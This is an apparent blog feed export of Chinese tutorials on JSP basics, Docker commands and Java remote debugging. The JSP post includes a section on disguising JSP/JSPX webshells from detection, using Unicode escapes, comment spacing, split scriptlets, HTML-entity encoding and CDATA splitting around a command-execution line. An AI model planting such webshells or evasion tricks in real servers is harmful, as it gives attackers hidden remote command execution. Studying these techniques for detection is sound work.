class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/html&gt;&quot;</span>);    &#125; <span class="hljs-keyword">catch</span> (java.lang.Throwable t) &#123;      <span class="hljs-keyword">if</span> (!(t <span class="hljs-keyword">instanceof</span> javax.servlet.jsp.SkipPageException))&#123;        out = _jspx_out;        <span class="hljs-keyword">if</span> (out != <span class="hljs-keyword">null</span> &amp;&amp; out.getBufferSize() != <span class="hljs-number">0</span>)          <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">if</span> (response.isCommitted()) &#123;              out.flush();            &#125; <span class="hljs-keyword">else</span> &#123;              out.clearBuffer();            &#125;          &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;&#125;        <span class="hljs-keyword">if</span> (_jspx_page_context != <span class="hljs-keyword">null</span>) _jspx_page_context.handlePageException(t);        <span class="hljs-keyword">else</span> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ServletException(t);      &#125;    &#125; <span class="hljs-keyword">finally</span> &#123;      _jspxFactory.releasePageContext(_jspx_page_context);    &#125;  &#125;&#125;</code></pre></div><h2 id="jsp指令"><a href="#jsp指令" class="headerlink" title="jsp指令"></a>jsp指令</h2><p>JSP指令用来设置整个JSP页面相关的属性。</p><h3 id="page指令"><a href="#page指令" class="headerlink" title="page指令"></a>page指令</h3><p>功能：</p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">Page</span>指令为容器提供当前页面的使用说明。一个JSP页面可以包含多个<span class="hljs-attribute">page</span>指令。</code></pre></div><p>语法：</p><div class="code-wrapper"><pre><code class="hljs pgsql">&lt;%@ page <span class="hljs-keyword">attribute</span>=&quot;value&quot; %&gt;等价<span class="hljs-type">xml</span>语法：&lt;jsp:directive.page <span class="hljs-keyword">attribute</span>=&quot;value&quot; /&gt;</code></pre></div><p>常用属性：</p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">import:</span>导入要使用的Java类<span class="hljs-symbol">language:</span>定义JSP页面所用的脚本语言，默认是Java<span class="hljs-symbol">contentType:</span>指定当前JSP页面的MIME类型和字符编码<span class="hljs-symbol">pageEncoding:</span>jsp页面编码，默认是UTF<span class="hljs-number">-8</span></code></pre></div><h3 id="include指令"><a href="#include指令" class="headerlink" title="include指令"></a>include指令</h3><p>功能：</p><div class="code-wrapper"><pre><code class="hljs actionscript">JSP可以通过<span class="hljs-meta"><span class="hljs-keyword">include</span>指令来包含其他文件。被包含的文件可以是JSP文件、HTML文件或文本文件。包含的文件就好像是该JSP文件的一部分，会被同时编译执行。</span></code></pre></div><p>语法：</p><div class="code-wrapper"><pre><code class="hljs cmake">&lt;%@ <span class="hljs-keyword">include</span> <span class="hljs-keyword">file</span>=<span class="hljs-string">&quot;文件相对 url 地址&quot;</span> %&gt;等价XML语法：&lt;jsp:directive.<span class="hljs-keyword">include</span> <span class="hljs-keyword">file</span>=<span class="hljs-string">&quot;文件相对 url 地址&quot;</span> /&gt;</code></pre></div><h3 id="taglib指令"><a href="#taglib指令" class="headerlink" title="taglib指令"></a>taglib指令</h3><p>功能：</p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">JSP </span>API允许用户自定义标签，一个自定义标签库就是自定义标签的集合。Taglib指令引入一个自定义标签集合的定义，包括库路径、自定义标签。</code></pre></div><p>语法：</p><div class="code-wrapper"><pre><code class="hljs routeros">&lt;%@ taglib <span class="hljs-attribute">prefix</span>=<span class="hljs-string">&quot;c&quot;</span> <span class="hljs-attribute">uri</span>=<span class="hljs-string">&quot;&lt;http://java.sun.com/jsp/jstl/core&gt;&quot;</span> %&gt;等价XML语法：&lt;jsp:directive.taglib <span class="hljs-attribute">prefix</span>=<span class="hljs-string">&quot;c&quot;</span> <span class="hljs-attribute">uri</span>=<span class="hljs-string">&quot;&lt;http://java.sun.com/jsp/jstl/core&gt;&quot;</span> /&gt;使用：&lt;c:out <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;test&quot;</span>/&gt;</code></pre></div><h2 id="jsp语法"><a href="#jsp语法" class="headerlink" title="jsp语法"></a>jsp语法</h2><div class="code-wrapper"><pre><code class="hljs mel">&lt;% %&gt;：脚本片段，可在该片段定义java代码&lt;%! %&gt;：声明片段，可在该片段中定义变量供脚本片段中引用&lt;%= %&gt;：表达式，可引用脚本变量中的值</code></pre></div><h2 id="jsp的EL表达式"><a href="#jsp的EL表达式" class="headerlink" title="jsp的EL表达式"></a>jsp的EL表达式</h2><p>通过EL表达式可以在jsp页面中获取来自4个作用域<code>application</code>、<code>session</code>、<code>request</code>和<code>pageContext</code>中的数据</p><p>启用EL表达式</p><div class="code-wrapper"><pre><code class="hljs mel">&lt;%@ page isELIgnored=<span class="hljs-string">&quot;false&quot;</span> %&gt;</code></pre></div><h2 id="jsp隐式对象"><a href="#jsp隐式对象" class="headerlink" title="jsp隐式对象"></a>jsp隐式对象</h2><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p><code>javax.servlet.http.HttpServletRequest</code>类的实例，通过<code>setAttribute()</code>方法将对象存储在session作用域</p><p><strong>常用方法：</strong></p><div class="code-wrapper"><pre><code class="hljs dart">request.getRequestURL().toString()   <span class="hljs-comment">//获取请求的URL</span><span class="hljs-comment">//获取项目的URL地址</span>&lt;%    <span class="hljs-built_in">String</span> contextPath = request.getContextPath();    <span class="hljs-built_in">StringBuffer</span> requestURL = request.getRequestURL();    <span class="hljs-built_in">String</span> projectUrl = requestURL.substring(<span class="hljs-number">0</span>, requestURL.indexOf(request.getRequestURI())) + contextPath;%&gt;</code></pre></div><h3 id="response"><a href="#response" class="headerlink" title="response"></a>response</h3><p>javax.servlet.http.HttpServletResponse类的实例</p><h3 id="out"><a href="#out" class="headerlink" title="out"></a>out</h3><p>java.io.PrintWriter类的实例</p><p><strong>常用方法：</strong></p><div class="code-wrapper"><pre><code class="hljs fortran"><span class="hljs-keyword">out</span>.<span class="hljs-built_in">print</span>(); 在页面中输出文本，不换行。<span class="hljs-keyword">out</span>.println(); 在页面中输出文本并换行。<span class="hljs-keyword">out</span>.<span class="hljs-keyword">flush</span>();  刷新输出流。</code></pre></div><h3 id="jspContext"><a href="#jspContext" class="headerlink" title="jspContext"></a>jspContext</h3><p>对象 JspContext类的实例</p><h3 id="application"><a href="#application" class="headerlink" title="application"></a>application</h3><p><code>javax.servlet.ServletContext</code> 类的实例</p><p>可在servlet的doGet&#x2F;doPOST方法中通过<code>req.getServletContext()</code>获取，通过<code>setAttribute()</code>方法将对象存储在application作用域</p><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p><code>javax.servlet.ServletConfig</code> 类的实例</p><h3 id="pageContext"><a href="#pageContext" class="headerlink" title="pageContext"></a>pageContext</h3><p><code>javax.servlet.jsp.PageContext</code> 类的实例</p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p><code>javax.servlet.http.HttpSession</code> 类的实例</p><p>可在servlet的doGet&#x2F;doPOST方法中通过<code>req.getSession()</code>获取，通过<code>setAttribute()</code>方法将对象存储在session作用域</p><h3 id="page"><a href="#page" class="headerlink" title="page"></a>page</h3><p>对象 Object类的实例</p><h1 id="jsp-webshell的混淆"><a href="#jsp-webshell的混淆" class="headerlink" title="jsp webshell的混淆"></a><strong>jsp webshell的混淆</strong></h1><h2 id="使用Unicode编码代替字符"><a href="#使用Unicode编码代替字符" class="headerlink" title="使用Unicode编码代替字符"></a>使用Unicode编码代替字符</h2><p><strong>JSP可以识别Unicode编码后的代码</strong></p><p>单个u</p><div class="code-wrapper"><pre><code class="hljs golo">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;&lt;%    \\\\u006f\\\\u0075t.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;admin&quot;</span>);%&gt;</code></pre></div><p>多个u</p><div class="code-wrapper"><pre><code class="hljs golo">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;&lt;% o\\\\uuu0075\\\\uuu0074.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;caofalin&quot;</span>); %&gt;&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;&lt;% o\\\\uuuuuuu0075\\\\uuu0074.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;caofalin&quot;</span>); %&gt;</code></pre></div><h2 id="使用-注释代替空格"><a href="#使用-注释代替空格" class="headerlink" title="使用&#x2F;**&#x2F;注释代替空格"></a>使用&#x2F;**&#x2F;注释代替空格</h2><div class="code-wrapper"><pre><code class="hljs processing">&lt;%@page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*, java.util.Base64&quot;</span> %&gt;&lt;%    <span class="hljs-built_in">String</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">str</span><span class="hljs-comment">/**/</span>=<span class="hljs-comment">/**/</span><span class="hljs-string">&quot;admin&quot;</span>;    <span class="hljs-type">byte</span>[]<span class="hljs-comment">/**/</span>strBytes<span class="hljs-comment">/**/</span>=<span class="hljs-comment">/**/</span><span class="hljs-built_in">str</span>.<span class="hljs-property">getBytes</span>();    <span class="hljs-built_in">String</span><span class="hljs-comment">/**/</span>toString<span class="hljs-comment">/**/</span>=<span class="hljs-comment">/**/</span>Base64.<span class="hljs-property">getEncoder</span>().<span class="hljs-property">encodeToString</span>(strBytes);    \\\\u006f\\\\u0075t.<span class="hljs-property">println</span>(toString);%&gt;</code></pre></div><h2 id="使用拼接java代码语句"><a href="#使用拼接java代码语句" class="headerlink" title="使用&lt;% %&gt;拼接java代码语句"></a>使用&lt;% %&gt;拼接java代码语句</h2><div class="code-wrapper"><pre><code class="hljs mel">&lt;%@page import=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;&lt;%out.%&gt;&lt;%println%&gt;&lt;%(%&gt;&lt;%&quot;admin<span class="hljs-string">&quot;%&gt;&lt;%);%&gt;</span></code></pre></div><h1 id="jspx-webshell混淆"><a href="#jspx-webshell混淆" class="headerlink" title="jspx webshell混淆"></a>jspx webshell混淆</h1><h2 id="使用html实体编码绕过"><a href="#使用html实体编码绕过" class="headerlink" title="使用html实体编码绕过"></a>使用html实体编码绕过</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">jsp:root</span> <span class="hljs-attr">xmlns:jsp</span>=<span class="hljs-string">&quot;&lt;http://java.sun.com/JSP/Page&gt;&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&lt;http://www.w3.org/1999/xhtml&gt;&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">jsp:directive.page</span> <span class="hljs-attr">contentType</span>=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> <span class="hljs-attr">pageEncoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">jsp:scriptlet</span>&gt;</span>        //Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));        <span class="hljs-symbol">&amp;#x52;</span><span class="hljs-symbol">&amp;#x75;</span><span class="hljs-symbol">&amp;#x6e;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x6d;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x2e;</span><span class="hljs-symbol">&amp;#x67;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x52;</span><span class="hljs-symbol">&amp;#x75;</span><span class="hljs-symbol">&amp;#x6e;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x6d;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x2e;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x78;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x71;</span><span class="hljs-symbol">&amp;#x75;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x2e;</span><span class="hljs-symbol">&amp;#x67;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x50;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6d;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x22;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x6d;</span><span class="hljs-symbol">&amp;#x64;</span><span class="hljs-symbol">&amp;#x22;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x3b;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">jsp:scriptlet</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">jsp:root</span>&gt;</span></code></pre></div><h2 id="利用CDATA拆分关键字"><a href="#利用CDATA拆分关键字" class="headerlink" title="利用CDATA拆分关键字"></a>利用CDATA拆分关键字</h2><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/CDATA.png"></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">jsp:root</span> <span class="hljs-attr">xmlns:jsp</span>=<span class="hljs-string">&quot;&lt;http://java.sun.com/JSP/Page&gt;&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&lt;http://www.w3.org/1999/xhtml&gt;&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">jsp:directive.page</span> <span class="hljs-attr">contentType</span>=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> <span class="hljs-attr">pageEncoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">jsp:scriptlet</span>&gt;</span>        //Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));        Run&lt;![CDATA[time.get]]&gt;Run&lt;![CDATA[time]]&gt;().ex&lt;![CDATA[ec(request.get]]&gt;Parameter(&quot;cmd&quot;));    <span class="hljs-tag">&lt;/<span class="hljs-name">jsp:scriptlet</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">jsp:root</span>&gt;</span></code></pre></div><h1 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/214483">https://www.anquanke.com/post/id/214483</a></p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>docker</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Docker/docker/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Docker/docker/</url>
    
    <content type="html"><![CDATA[<h1 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h1><table><thead><tr><th>名称</th><th>功能</th></tr></thead><tbody><tr><td>attach</td><td></td></tr><tr><td>build</td><td>从Dockerfile构建镜像</td></tr><tr><td>commit</td><td>将容器制作为镜像</td></tr><tr><td>cp</td><td>在容器与本机文件系统间拷贝文件或文件夹</td></tr><tr><td>create</td><td>创建一个新的容器</td></tr><tr><td>diff</td><td>在容器的文件系统中检查文件或目录的修改</td></tr><tr><td>events</td><td></td></tr><tr><td>exec</td><td>在一个运行中的容器中执行命令</td></tr><tr><td>export</td><td>以压缩包的方式导出容器的文件系统</td></tr><tr><td>history</td><td></td></tr><tr><td>images</td><td></td></tr><tr><td>import</td><td></td></tr><tr><td>info</td><td></td></tr><tr><td>inspect</td><td>查看容器详细信息</td></tr><tr><td>kill</td><td></td></tr><tr><td>load</td><td>从tar压缩包或标准输入中导入镜像</td></tr><tr><td>volumn</td><td>容器的磁盘操作</td></tr><tr><td>logout</td><td></td></tr><tr><td>logs</td><td></td></tr><tr><td>pause</td><td></td></tr><tr><td>port</td><td>列出或指定容器的端口映射</td></tr><tr><td>ps</td><td>列出容器</td></tr><tr><td>pull</td><td>从镜像仓库拉取镜像</td></tr><tr><td>push</td><td>将镜像上传到镜像仓库</td></tr><tr><td>rename</td><td>重命名容器</td></tr><tr><td>restart</td><td>重启容器</td></tr><tr><td>rm</td><td>删除容器</td></tr><tr><td>rmi</td><td>删除镜像</td></tr><tr><td>run</td><td>在一个新的容器中运行命令</td></tr><tr><td>save</td><td>将镜像保存为tar压缩包</td></tr><tr><td>search</td><td>从dockerhub中搜索容器</td></tr><tr><td>start</td><td>启动容器</td></tr><tr><td>stats</td><td></td></tr><tr><td>stop</td><td></td></tr><tr><td>tag</td><td></td></tr><tr><td>top</td><td>显示容器的运行进程</td></tr><tr><td>unpause</td><td></td></tr><tr><td>update</td><td></td></tr><tr><td>version</td><td></td></tr><tr><td>wait</td><td></td></tr></tbody></table><h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><p>vim &#x2F;etc&#x2F;docker&#x2F;daemon.json</p><div class="code-wrapper"><pre><code class="hljs bash">&#123;  <span class="hljs-string">&quot;proxies&quot;</span>: &#123;    <span class="hljs-string">&quot;http_proxy&quot;</span>: <span class="hljs-string">&quot;http://proxy.lfk.qianxin-inc.cn:3128&quot;</span>,    <span class="hljs-string">&quot;https_proxy&quot;</span>: <span class="hljs-string">&quot;http://proxy.lfk.qianxin-inc.cn:3128&quot;</span>  &#125;&#125;</code></pre></div><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>身份认证</p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker login</span></code></pre></div><h2 id="run"><a href="#run" class="headerlink" title="run"></a>run</h2><p>功能：创建容器</p><p>-d 在后台运行一个容器</p><p>-e 设置环境变量</p><p>-p 容器与宿主机的端口映射</p><p>-i 保持标准输入开启</p><p>-t 分配一个伪终端</p><p>-id 创建守护式容器 通过docker exec进入容器</p><p>-it 创建交互式容器</p><p>-w 设置容器内的工作目录</p><p>-v 设置容器与宿主机的卷映射</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment">#创建容器运行并入</span>docker <span class="hljs-built_in">run</span> -it &lt;image_id&gt; bash<span class="hljs-comment">#创建一个容器后台运行</span>docker <span class="hljs-built_in">run</span> -d &lt;image_id&gt;<span class="hljs-comment">#创建容器并指定容器名</span>docker <span class="hljs-built_in">run</span> -d --name &lt;container_name&gt; &lt;container_id&gt;</code></pre></div><p>启动容器</p><div class="code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment">#启动单个容器</span>docker <span class="hljs-built_in">start</span> &lt;container_id&gt;<span class="hljs-comment">#启动所有容器</span>docker <span class="hljs-built_in">start</span> <span class="hljs-variable">$</span>(docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-aq</span>)</code></pre></div><p>停止容器</p><div class="code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-comment">#停止单个容器</span>docker <span class="hljs-literal">stop</span> <span class="hljs-tag">&lt;container_id&gt;</span><span class="hljs-comment">#停止所有容器</span>docker <span class="hljs-literal">stop</span> $(docker ps -aq)</code></pre></div><p>删除容器</p><div class="code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment">#删除单个容器</span>docker <span class="hljs-built_in">rm</span> &lt;container_id&gt;<span class="hljs-comment">#删除所有容器</span>docker <span class="hljs-built_in">rm</span> <span class="hljs-variable">$</span>(docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-aq</span>)</code></pre></div><p>删除镜像</p><div class="code-wrapper"><pre><code class="hljs crystal"><span class="hljs-comment">#删除单个镜像</span>docker rmi &lt;image_id&gt;<span class="hljs-comment">#删除所有镜像</span>docker rmi <span class="hljs-variable">$(</span>docker images -aq)</code></pre></div><p>上传镜像至镜像仓库</p><div class="code-wrapper"><pre><code class="hljs xml">docker push <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>/<span class="hljs-tag">&lt;<span class="hljs-name">image_name</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">tag_version</span>&gt;</span></code></pre></div><p>复制文件</p><div class="code-wrapper"><pre><code class="hljs elixir">docker cp /path/to/file &lt;container_id&gt;<span class="hljs-symbol">:/path/to/file</span>docker cp &lt;container_id&gt;<span class="hljs-symbol">:/path/to/file</span> /path/to/file</code></pre></div><p>执行命令</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#启动一个交互式shell</span>docker <span class="hljs-built_in">exec</span> -it &lt;container_id&gt; bash<span class="hljs-comment">#执行命令</span>docker <span class="hljs-built_in">exec</span> &lt;container_id&gt; cmd</code></pre></div><h2 id="镜像制作"><a href="#镜像制作" class="headerlink" title="镜像制作"></a>镜像制作</h2><div class="code-wrapper"><pre><code class="hljs pf">docker commit <span class="hljs-variable">&lt;container_id&gt;</span> <span class="hljs-variable">&lt;custom_image_name&gt;</span>:<span class="hljs-variable">&lt;tag_version&gt;</span>docker save -o <span class="hljs-variable">&lt;imagefile&gt;</span> <span class="hljs-variable">&lt;image_name&gt;</span>:<span class="hljs-variable">&lt;tag_version&gt;</span>docker <span class="hljs-built_in">load</span> -i <span class="hljs-variable">&lt;imagefile&gt;</span></code></pre></div><h1 id="常用镜像"><a href="#常用镜像" class="headerlink" title="常用镜像"></a>常用镜像</h1><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run --name mysql -e MYSQL_ROOT_PASSWORD=<span class="hljs-number">123456</span> -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> -d mysql:<span class="hljs-number">5</span>.<span class="hljs-number">7</span>.<span class="hljs-number">36</span></code></pre></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>安装：<a href="https://docs.docker.com/engine/install/centos/">https://docs.docker.com/engine/install/centos/</a></p><p>语法：<a href="https://www.cnblogs.com/effort-blog/p/17010502.html">https://www.cnblogs.com/effort-blog/p/17010502.html</a></p>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>远程调试</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Java/%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Java/%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Java远程调试"><a href="#Java远程调试" class="headerlink" title="Java远程调试"></a>Java远程调试</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>Java远程调试的原理是两个VM之间通过debug协议JDWP（Java Debug Wire Protocol）进行通信，需确保本地的Java的源代码与目标应用程序一致就可以成功调试，在这里我们通常会认为远程JVM是debug服务器，本地JVM是debug客户端。</p><p>java应用启动的两种方式</p><p>1、命令行直接执行启动</p><p>如java -jar xxxx.jar，jar包一般为sprintboot生成的web应用包</p><p>2、通过启动脚本启动</p><p>远程调试前提</p><p>1、本地JVM和远程JVM可以网络通信。</p><p>2、本地JVM需要有目标JVM相同的源代码。</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ul><li>Web应用开启debug模式</li><li>获取web应用的业务依赖类文件</li><li>idea创建调试项目并将依赖类文件加入项目</li><li>idea配置远程调试</li></ul><h2 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h2><p><strong>以下两种两种参数都是修改JVM参数，大多数web应用都是修改<code>JAVA_OPTS</code>参数</strong></p><p>方式一</p><div class="code-wrapper"><pre><code class="hljs elm">-<span class="hljs-type">Xdebug</span> -<span class="hljs-type">Xrunjdwp</span>:trans<span class="hljs-keyword">port</span>=dt_socket,server=y,suspend=n,address=8888</code></pre></div><p>方式二</p><div class="code-wrapper"><pre><code class="hljs elm">-agentlib:jdwp=trans<span class="hljs-keyword">port</span>=dt_socket,server=y,suspend=n,address=8888</code></pre></div><h1 id="开启调试"><a href="#开启调试" class="headerlink" title="开启调试"></a>开启调试</h1><p><strong>通用思路</strong></p><p>查找应用的启动脚本或配置文件，找到配置JVM参数的地方加入调试参数</p><h2 id="Jar文件"><a href="#Jar文件" class="headerlink" title="Jar文件"></a>Jar文件</h2><p>在启动行直接加入调试参数</p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-agentlib:<span class="hljs-keyword">jdwp=transport=dt_socket,server=y,suspend=n,address=xxxx </span>-<span class="hljs-keyword">jar </span>xxxx.<span class="hljs-keyword">jar</span></code></pre></div><h2 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h2><h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3><p>设置debug监听端口，weblogic的debug模式默认监听8453端口</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/debug-10.png"> </p><p>修改启动脚本</p><div class="code-wrapper"><pre><code class="hljs awk">%WEBLOGIC_HOME%<span class="hljs-regexp">/Oracle/</span>Middleware<span class="hljs-regexp">/user_projects/</span>domains<span class="hljs-regexp">/base_domain/</span>bin/setDomainEnv.sh</code></pre></div><p>在if [ “${debugFlag}” &#x3D; “true” ] ; then前加入两行</p><div class="code-wrapper"><pre><code class="hljs jsx">debugFlag=<span class="hljs-literal">true</span><span class="hljs-keyword">export</span> debugFlag</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/debug-11.png"></p><p>重启weblogic</p><h3 id="Tomcat-致远-用友-SmartBI"><a href="#Tomcat-致远-用友-SmartBI" class="headerlink" title="Tomcat&#x2F;致远&#x2F;用友&#x2F;SmartBI"></a>Tomcat&#x2F;致远&#x2F;用友&#x2F;SmartBI</h3><p><strong>Linux</strong></p><p>修改%TOMCAT_HOME%&#x2F;bin&#x2F;catalina.sh文件，在头部位置添加参数</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">CATALINA_OPTS</span>=<span class="hljs-string">&quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8888&quot;</span></code></pre></div><p><strong>Windows</strong></p><p>修改%TOMCAT_HOME%&#x2F;bin&#x2F;catalina.bat文件，在文件头部位置添加参数</p><div class="code-wrapper"><pre><code class="hljs xml">SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8888</code></pre></div><p>重启tomcat</p><h3 id="Resin-泛微"><a href="#Resin-泛微" class="headerlink" title="Resin&#x2F;泛微"></a>Resin&#x2F;泛微</h3><p>修改配置文件</p><div class="code-wrapper"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">WEAVER_HOME</span></span>%\Resin\\conf\resin.properties</code></pre></div><p>搜索关键字<code>jvm_args</code> 加入调试参数</p><div class="code-wrapper"><pre><code class="hljs elm">-agentlib:jdwp=trans<span class="hljs-keyword">port</span>=dt_socket,server=y,suspend=n,address=8888</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230818182918976.png"></p><p>重启resin服务</p><p>将泛微OA中所有的jar和class文件导入idea中，设置断点即可调试。</p><h3 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h3><p><strong>启动方式一：bin\win64\activemq.bat start</strong></p><p>修改bin\win64\wrapper.conf文件</p><p>搜索关键语句</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># Uncomment to enable remote debugging</span></code></pre></div><p>取消注释，并将n修改为实际序号，开启远程调试</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231027171952340.png"></p><p><strong>启动方式二：bin\activemq.bat start</strong></p><p>修改bin\env文件</p><div class="code-wrapper"><pre><code class="hljs plain"># Uncomment to enable remote debuggingACTIVEMQ_DEBUG_OPTS=&quot;-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8888&quot;</code></pre></div><h1 id="获取项目依赖类-文件"><a href="#获取项目依赖类-文件" class="headerlink" title="获取项目依赖类&#x2F;文件"></a>获取项目依赖类&#x2F;文件</h1><p>Linux系统</p><div class="code-wrapper"><pre><code class="hljs bash">find ./ -name <span class="hljs-string">&quot;*.jar&quot;</span> -<span 